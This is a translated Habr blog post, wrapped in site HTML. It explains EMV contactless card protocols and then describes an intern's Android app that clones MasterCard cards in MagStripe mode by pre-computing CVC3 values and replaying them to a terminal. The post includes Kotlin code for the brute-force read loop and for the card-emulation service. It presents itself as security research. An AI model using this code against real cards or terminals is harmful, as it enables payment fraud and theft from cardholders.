<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Clone a contactless card using a mobile application</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="It was always interesting to see what was going on with a bank card under the hood. How the bank card and POS terminal communication protocol is imple...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Clone a contactless card using a mobile application</h1><div class="post__text post__text-html js-mediator-article">  It was always interesting to see what was going on with a bank card under the hood.  How the bank card and POS terminal communication protocol is implemented, how it works and how secure it is.  This opportunity appeared before me when I was an intern at Digital Security.  As a result, when analyzing one known EMV card vulnerability in MagStripe mode, it was decided to implement a mobile application that is able to communicate with the terminal via a contactless interface, using its own commands and detailed analysis of requests and responses.  And also try to implement the method of cloning MasterCard cards in MagStripe mode. <br><br>  In this article I will try to describe what an EMV card is, how it works and how using Android you can try to clone your MasterCard card. <br><br>  <i><b>‚ÄúThere are some things that can't buy.</b></i>  <i><b>For everything else, there's MasterCard</b></i> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  What is an EMV card? </h3><br>  EMV is an international standard for bank cards with a chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA participated in the development of this standard, hence the name.  Let's try to figure out how all the same card communicates with the POS-terminal on a contactless interface. <br><a name="habracut"></a><br>  Let's start with the basics. <br><br>  The non-contact EMV card at the physical level works in much the same way as an RFID tag.  If the basis is that, the chip enters the electromagnetic field, and in a closed conducting circuit (in our case it will be an antenna located along the perimeter) placed in an alternating magnetic field, an alternating electric current is formed.  This current charges a special capacitor connected in parallel to the resonant circuit of the card.  The energy stored in the capacitor is used to perform various operations on the chip card.  When the reader changes the electromagnetic field, the changes will immediately be noticeable on the chip.  Using signal modulation, we can transmit information in binary form.  If you connect a load resistance on the card and or change the capacitance of the capacitor, you can change the current in the circuit of the card, which will lead to a change of the electromagnetic field created by it in the area of ‚Äã‚Äãthe reader circuit, thus the card transmits data.  The reader will need to detect these changes.  Such physical interaction is governed by the ISO / IEC 14443 <i>‚ÄúIdentification Cards - Contactless integrated circuit (s) cards - Proximity cards‚Äù</i> standard. <br><br>  The chip card itself is a smart card that runs JavaCard, a separate version of Java for platforms with small computing resources and support for cryptographic algorithms.  On JavaCard applets are loaded, which are applications.  There is also GlobalPlatform is a kind of standard for JavaCard, which provides the ability to securely manage data on the card and allows you to download, modify and delete applications on the card.  In this article, we will not consider the security mechanisms of the smart card itself.  It is enough to know that the protected data, for example, the private key and the secret master key of the card are in a protected place and it is impossible to pull them out with standard means. <br><br>  I will also remind you a bit of terminology for those who are not familiar. <br><br>  <b>POS-terminal</b> (Point of Sale) is a seller's device that reads a card and initiates a payment.  Further we will call this device simply a terminal. <br>  <b>The issuer bank</b> is the bank that issued your card. <br>  <b>The acquirer bank</b> is a bank that issues POS-terminals to merchants and processes payments from them. <br>  <b>The payment system</b> is the central link between the acquiring bank and the issuing bank, absolutely all payments pass through it, and it knows which bank should transfer money to which one.  There are many payment systems in the world, except well-known <b>Visa</b> and <b>MasterCard,</b> there is also <b>American Express</b> , <b>China UnionPay</b> and the Russian payment system <b>MIR</b> . <br><br>  Well, the card and reader can communicate.  They send each other APDU commands as <a href="https://ru.wikipedia.org/wiki/Tag-length-value">Tag-Length-Value</a> i.e.  the name of the tag is transmitted in hexadecimal, its length and the value itself.  All commands are described of course in the <a href="https://www.emvco.com/">documentation</a> and look like this: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="image"><br><br>  The standard EMV transaction goes through several stages, I will describe the full interaction algorithm in the case of a contact interface, the algorithm is somewhat shortened for a contactless interface: <br><br><ul><li>  Application selection; </li><li>  Initialization of application processing; </li><li>  Read application data; </li><li>  Offline authentication; </li><li>  Handling restrictions; </li><li>  Check card holder; </li><li>  Risk management on the side of the terminal; </li><li>  Analysis of terminal actions; </li><li>  Risk management on the side of the card; </li><li>  Analysis of card actions; </li><li>  On-line processing; </li><li>  Completion of the operation. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="image"><br><br>  Briefly consider each operation. <br><br>  Select an application.  It often happens that there can be several applications on one map.  For example, a bank card and a ticket.  And the terminal somehow needs to figure out where and which algorithm to use.  To select an application, so-called <b>Application Identifier</b> Codes ( <b>Application Identifier - AID</b> ) are used.  To understand this, the terminal sends a <b>SELECT</b> command.  For example, the <b>AID of the</b> Visa Classic card will look like this: <b>A0000000031010</b> .  If several such codes come in response and the terminal is able to work with several applications, the terminal will display a list and prompt you to select the application we need.  If the terminal does not support any of the application codes, then the operation will be rejected by the terminal. <br><br>  Initialization processing application.  Here, the geographical location is checked first.  For example, Maestro Momentum cards can work for payment only in Russia.  This stage was made in order to provide issuers with the opportunity to apply existing online risk management methods when conducting offline operations.  At this stage, an EMV transaction can be canceled at the initiative of the card itself, if this type of operation is prohibited in this country of the world by the issuer.  Next, the card transmits to the terminal a set of specially structured information containing a description of the card and application functionality. <br><br>  Read application data.  The terminal transmits various card data necessary for the transaction, for example, card number, expiration date, transaction counter and a lot of other data.  Some of them will be discussed below. <br><br>  Sample data: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="image"><br><br>  The certificate of the public key of the issuer's bank and the card itself is also transferred.  In order for the terminal to be able to verify the digital signature of some map data, the Public Key Infrastructure ( <b>PKI</b> ) is used.  In short, the payment system has a pair of keys - public and private, and the payment system is for all participants of <b>CA (Center Authority)</b> .  In essence, the payment system for each issuer bank issues a new key pair, and at the same time forms the public key certificate of the issuing bank, signing it with the CA private key.  Further, when the bank issues a new card, it accordingly generates a pair of keys for the card, and also forms a certificate of the public key of the card, signing it with the help of the bank's private key.  In terminals, a public key certificate is usually sewn for various payment systems.  Thus, when the card transmits the public key certificate of the issuing bank and the certificate of the card itself, the terminal can easily check the entire chain using the public key of the payment system.  Using the public key of the payment system, the terminal first verifies the authenticity of the issuer's bank certificate, if it is genuine, then it can be trusted and now with the issuer's bank certificate you can verify the certificate of the card itself.  More details in the article <a href="http://habr.com/post/281438">about the safety of EMV</a> . <br><br>  Offline authentication.  The terminal determines the type of method supported offline authentication.  There is static ( <b>Static Data Authentication - SDA</b> ), dynamic ( <b>Dynamic Data Authentication - DDA</b> ) and combined ( <b>Combined Data Authentication - CDA</b> ).  These methods are also PKI based.  <b>SDA</b> is simply signed data on the issuer's bank's private key, the <b>DDA</b> terminal sends some random number and the card must sign it using its private key, and the terminal will verify this signature using the card certificate obtained earlier, thus the terminal will make sure that The card really has a private key - hence it is genuine.  <b>CDA</b> is simply a combination of both. <br><br>  Handling restrictions.  Here the terminal checks the previously obtained data from the card for a condition of suitability for this operation.  For example, it checks the expiration / expiration dates for the <b>Application Expiration Date (Tag '5F24')</b> and <b>Application Effective Date (Tag '5F25') applications</b> .  The application version is also checked.  The results of operations carried out at this stage are also recorded in the <b>TVR</b> report <b>(Terminal verification results)</b> .  As a result of this step, the transaction cannot be canceled, even if, for example, the application has expired. <br><br>  Check card holder.  Verification of the cardholder is made in order to authenticate the person who submitted the card and to verify whether he is the real cardholder.  The EMV standard provides various cardholder verification methods ( <b>Cardholder Verification Method</b> ).  Verification methods are defined both on the terminal and on the map.  They are contained in the so-called <b>CVM lists</b> .  In the process of execution, the terminal and the card compare the received CVM sheets and select the general verification method. <br><br>  List of supported verification methods: <br><br><ul><li>  No CVM required ('011111'b); </li><li>  Fail CVM processing ('000000'b); </li><li>  Signature ('011110'b); </li><li>  Enciphered PIN verified online ('000010'b); </li><li>  Plaintext PIN verification performed by ICC ('000001'b); </li><li>  ICC and signature ('000011'b); </li><li>  ICC ('000100'b) Enciphered PIN verification performed by; </li><li>  Enciphered PIN verifi cation and signature ('000101'b). </li></ul><br>  Here <a href="https://habr.com/post/244107/">is</a> also interesting information on this topic. <br><br>  Risk management on the side of the terminal.  At this stage, the terminal conducts an internal check of the parameters of the transaction, based on the settings of the risk management of the acquiring bank.  Risk management procedures can be performed by the terminal at any time between the completion of the card data reading process and the generation of the first <b>GENERATE AC</b> command by the terminal.  Terminal-side risk management includes three mechanisms: <br><br><ul><li>  control of the size of operations performed on the map ( <b>Floor Limit Checking</b> ); </li><li>  random selection of transactions for online authorization of this transaction by the issuer ( <b>Random Transaction Selection</b> ); </li><li>  check offline activity using the map ( <b>Velocity Checking</b> ). </li></ul><br>  Analysis of terminal actions.  At this stage, the terminal analyzes the results of the previous steps of the transaction.  Based on the results of the analysis, the terminal decides whether to conduct the operation online, allow it to be conducted offline or reject the operation. <br><br>  Risk management on the side of the card.  The card, having received from the <b>GENERATE AC</b> command data relating to the transaction, the terminal and the results of the terminal checks, in turn, performs its own risk management procedures and makes its own decision about the method of completion of the operation. <br><br>  Analysis of card actions.  At this stage, the card completes the implementation of risk management procedures and generates a response cryptogram for the terminal.  If the card decides to approve a transaction, then a <b>Transaction Certificate</b> is formed.  If the card decides to perform the operation in real time, then it forms an <b>ARQC (Authorization Request Cryptogram)</b> .  If the card uses alternative authorization methods, then <b>Application Authorization Referral is used</b> .  In case the card rejects the transaction, then <b>Application Authentication Cryptogram</b> . <br><br>  Another <b>ARPC</b> cryptogram <b>(Authorization Response Cryptogram) is</b> needed to authenticate the issuer.  The issuer generates an ARPC cryptogram and sends the cryptogram to the card, if the card confirms the received cryptogram, then the issuer is authenticated by the card. <br><br>  A little about the security of keys and mutual authentication of the card and the issuer from the book of I. M. Goldovsky: <blockquote>  The point of mutual authentication is that the card and the terminal authenticate each other using ARQC and ARPC cryptograms.  Cryptograms are data generated using a secret key (which is known to the card and the bank to the issuer), transaction numbers, a random number generated by the terminal, as well as some transaction details, a terminal, and a card.  In the case of ARPC, the authorization response code of the issuer is added to the listed data.  Without knowing the secret key of a card to generate a cryptogram, it is impossible to calculate ARQC / ARPC values ‚Äã‚Äãin the foreseeable time with the current level of technology, and therefore the fact of their successful verification indicates the authenticity of the card and the issuer.  Online authentication is the most reliable way to authenticate a card.  This is due to the fact that it is executed directly by the issuer, without an intermediary in the form of a terminal.  In addition, for online authentication, the 3DES algorithm with a 112-bit temporary key is used, the cryptographic strength of which corresponds to the robustness of the RSA algorithm with the asymmetric key module length used for offline authentication of the card application is more than 1,700 bits.  The use of asymmetric keys of such length on the map is still quite rare.  Keys with a module length of 1024, 1152, or 1408 bits are commonly used. </blockquote><br><br>  In the end, the online transaction goes through the chain: <br>  <b>Map &lt;-&gt; POS-Terminal &lt;-&gt; Bank Acquirer &lt;-&gt; Payment System &lt;-&gt; Bank Issuer.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="image"><br><br><h3>  Clone MasterCard in MagStripe Mode </h3><br>  We proceed directly to the principle of cloning.  This method of attacking contactless cards was published by two researchers <a href="https://github.com/MatusKysel/EMVemulator/raw/master/Cloning%2520Credit%2520Cards%2520A%2520combined%2520pre-play-Roland.pdf">Michael Roland, Josef Langer</a> of the University of Austria.  It is based on a general principle called <i>Skimming</i> .  This is a scenario in which an attacker steals money from a bank card by reading (copying) information from this card.  In general, it is important to keep the PIN secret and not to allow it to leak.  But in the method of the Austrian guys, we do not need to know this.  Payment card cloning is performed successfully for the kernel version of the EMV Contactless Kernel 2 application. The version of this protocol supports two modes of operation for contactless cards: EMV protocol <b>(MasterCard PayPass M / Chip)</b> and <b>MagStripe (MasterCard PayPass MagStripe)</b> mode. <br><br>  <b>MagStripe</b> is a magnetic stripe support mode.  This mode is implemented on MasterCard cards with a contactless interface.  MagStripe mode is most likely needed for banks that find it difficult to transfer the entire infrastructure to support chipless contactless EMV transactions.  By the way, Visa cards also have a similar mode of operation - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  The transaction processing process for contactless cards is trimmed compared to chip cards and usually works in the following mode: <br><br><ol><li>  The terminal sends the <b>SELECT PPSE</b> (Proximity Payment System Environment) command.  The card sends a list of supported applications. </li><li>  The terminal sends a <b>SELECT</b> command.  In response, receives the necessary details of the application. </li><li>  The terminal sends the <b>GET_PROCESSING_OPTIONS</b> command.  The card answers what type of authentication it supports and whether there is verification of the cardholder there. </li><li>  The terminal sends the <b>READ_RECORDS</b> command.  The card in response sends Track1 and Track2 almost the same as that recorded on the magnetic stripe of the card. </li><li>  The terminal sends the <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> command.  Which means that the card should, based on the transmitted Unpredictable Number, generate the value of CVC3. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="image"><br><br><div class="spoiler">  <b class="spoiler_title">How does all this look in real life?</b> <div class="spoiler_text">  It looks like an <a href="https://habr.com/post/367241/">APDU</a> command.  <a href="https://www.eftlab.co.uk/index.php/site-map/knowledge-base/118-apdu-response-list">List of all tags</a> . <br><br>  APDU - Application Protocol Data Unit is a symbol of a frame with a command map or a response card. <br><br>  On Habr√© there are a couple of articles on this topic <a href="https://habr.com/post/367241/">here</a> and <a href="https://habr.com/post/210062/">here</a> . <br></div></div><br>  The card supports the special COMPUTE CRYPTOGRAPHIC CHECKSUM command, whose argument is the data defined in the Unpredictable Number Data Object (UDOL) object.  <b>As a result, the card uses the 3DES algorithm and the secret key to calculate the CVC3 (Card Verification Code) dynamic value.</b>  The 3DES function concatenates UDOL data and transaction counters (Application Transaction Counter, ATC) as an argument.  <b>Thus, the value of CVC3 is always dependent on UN and ATC objects.</b> <br><br>  In other words, this command is needed for the card to generate some kind of ‚Äúsignature‚Äù in order for the issuer to verify the card.  However, in this signature there is no signature of the transaction itself.  The signature contains the <b>ATC</b> values <b>- 2 bytes</b> , <b>CVC3 (Track1) - 2 bytes</b> , <b>CVC3 (Track2) - 2 bytes</b> , which are generated by the card based on the secret key that the issuing bank and transaction count (ATC) also know.  At the same time, for generating a signature, the POS terminal informs the <b>UN</b> card <b>(Unpredictable Number)</b> 4 bytes, which is also used in generating the signature.  Unpredictable Number prevents the formation of authentication codes on a real card for later use in fraudulent transactions.  We are strongly hampered by UN for an attack, since it is not possible to iterate over 4 bytes without going beyond the transaction counter.  However, there are some weaknesses in this specification. <br><br>  First, the specification limits the UN to a number encoding, namely the <a href="https://ru.wikipedia.org/wiki/%25D0%2594%25D0%25B2%25D0%25BE%25D0%25B8%25D1%2587%25D0%25BD%25D0%25BE-%25D0%25B4%25D0%25B5%25D1%2581%25D1%258F%25D1%2582%25D0%25B8%25D1%2587%25D0%25BD%25D1%258B%25D0%25B9_%25D0%25BA%25D0%25BE%25D0%25B4">Binary-Decimal Code (BCD)</a> , which essentially means that if we look at such an encoded number in HEX, we will only see numbers from 0 to 9, all other values ‚Äã‚Äãare considered as if forbidden.  Thus, the number of UN is reduced from 4,294,967,295 to 99,999,999. <br><br>  Secondly, the number of significant digits UN is determined by the card.  Thus, depending on the special parameters in the tracks, the number of digits in the UN can be from 10 to 10,000, depending on the type of card, in practice, the most common is 1000 values. <br><br>  <b>Thus, the attack plan is as follows:</b> <br><br><ol><li>  We read the card and find out the number of significant digits from the UN, which the terminal will provide </li><li>  We iterate over all UN, we get all possible values ‚Äã‚Äãof the <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> function, store them in the appropriate table with the UN -&gt; Result mapping </li><li>  We bring to the POS-terminal, find out the number that the POS-terminal asks for. </li><li>  Select the desired result from the table and substitute it in response to the terminal. </li><li>  The transaction goes away. </li><li>  PROFIT.  But the success of the approval of the transaction is not guaranteed, since the issuer bank may reject such a transaction. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="image"><br><br>  It is also worth noting that the transaction counter (ATC) prevents the reuse of previously used authentication codes, which means that if we used such an attack, you need to copy the card again, because the transaction counter was already used to obtain information and was used in the signature, which means that if we had a transaction counter of 1000, and after we sent the transaction to the bank, the bank will no longer accept transactions with a counter below &lt;1001.  In addition, the transaction counter is limited to 2 bytes, which means that we can perform no more than 65 card cloning cycles, after which the card will most likely stop working. <br><br>  In most cases, the data transferred from the card is static for all transactions.  Of course, except <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  To generate a dynamic CVC3 code, the map application must be read by the <b>SELECT</b> command, then <b>GET_PROCESSING_OPTIONS</b> , and only then by <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b> and this is a rather important point.  These three commands are required to generate CVC3.  According to the experiment using only these three teams, the <b>search for 1000 values ‚Äã‚Äãon the Google Galaxy Nexus S took only one minute.</b> <br><br>  To work with the terminal and the card used the program <b>Terminal Simulator</b> from MasterCard.  It works great with various NFC readers and smart card readers.  In addition, it is absolutely free.  It allows you to test cards with different settings of the POS terminal and maintains a detailed log of all requests from the terminal and card responses.  It can also be used to test an application on a phone operating in card mode. <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="image"><br><br>  For reading the card used NFC reader <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="image"><br><br>  Now let's try to convert all this into code.  We will write the application in the Kotlin language for Android.  First we will try to describe the general structure of the team. <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  First we need to set up work with NFC.  On the phone, we can work in two modes.  In card mode, this is when we respond to commands from the terminal, and in terminal mode when we send commands and read, for example, cards.  Those.  at first we can clone the map, and then make it so that we respond to requests from the terminal with already prepared commands. <br><br>  Further simplified implementation of interaction with NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Here we describe the sequence of commands and enumeration of the Unpredictable Number values ‚Äã‚Äãin the loop from 0 to 999, change the Nc command to ‚Äú00000 $ {String.format ("% 03d ", i)}}." Replace (".. (?! $ ) ". toRegex ()," $ 0 ").  And do not forget to perform GET_PROCESSING_OPTIONS each time before COMPUTE_CRYPTOGRAPHIC_CHECKSUM, otherwise the check amount will not be counted. <br><br>  As a result, all this can be written to a file and used already when working with a real terminal.  Here we get the name and card number, we can display it on the screen. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  A set of commands that we need. <br><br><pre> <code class="plaintext hljs">object Commands { val SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  To implement the wiretapping of commands from the terminal, you must start your service and declare it in the manifest.  In this service, a command from the terminal comes in processCommandApdu, we compare it with the one we have stored in the file, and give the answer, which is written in the next line. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  A couple of screenshots from the application.  Read the card and the parsing log: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Thus, you can simulate the work of a contactless EMV card on the phone with the card data.  But fortunately or unfortunately for someone, this attack does not work in Russia.  According to our experiments, the transaction all the time reached the issuing bank and was rejected by the bank itself.  In addition, we could not conduct an offline transaction using MagStripe.  However, such an attack may well be implemented in other countries where using MagStripe mode is quite common and the risk management algorithm is slightly different, for example in the USA. <br><br><h4>  References, by which this article appeared </h4><br>  Bank microprocessor cards / I. M. Goldovsky - M .: TsIPSiR: Alpina Pub licherz, 2010. - 686 p. <br>  <a href="https://www.plusworld.ru/journal/section_909/section_139906/art140245/">EMV project: step by step</a> <br>  <a href="https://github.com/MatusKysel/EMVemulator/raw/master/Cloning%2520Credit%2520Cards%2520A%2520combined%2520pre-play-Roland.pdf">Research Austrian researchers</a> <br>  <a href="https://github.com/NooAn/CardPayPassPass">Link to application code</a> <br>  <a href="https://www.terminalsimulator.com/Simulator/Details%3FsimulatorVersionId%3D84">Terminal Simulator.</a> <br><br>  Thanks to <a href="https://habr.com/users/barracud4/" class="user_link">barracud4</a> for help in preparing for the article. </div><p>Source: <a href="https://habr.com/ru/post/421543/">https://habr.com/ru/post/421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
